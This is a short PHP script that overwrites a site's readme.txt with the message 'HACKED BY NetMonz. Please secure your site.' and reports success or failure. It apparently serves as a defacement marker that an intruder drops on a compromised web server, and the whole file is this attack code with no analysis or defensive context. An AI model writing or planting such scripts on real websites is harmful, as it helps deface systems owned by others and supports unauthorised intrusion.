<?php
$targetfile = "readme.txt";
$content = "HACKED BY NetMonz.\r\n";
$content .= "Please secure your site.\r\n";

$putsfile = file_put_contents($targetfile, $content);

if($putsfile){
    echo "OK";
    }
else{
    echo "fail";
}
?>
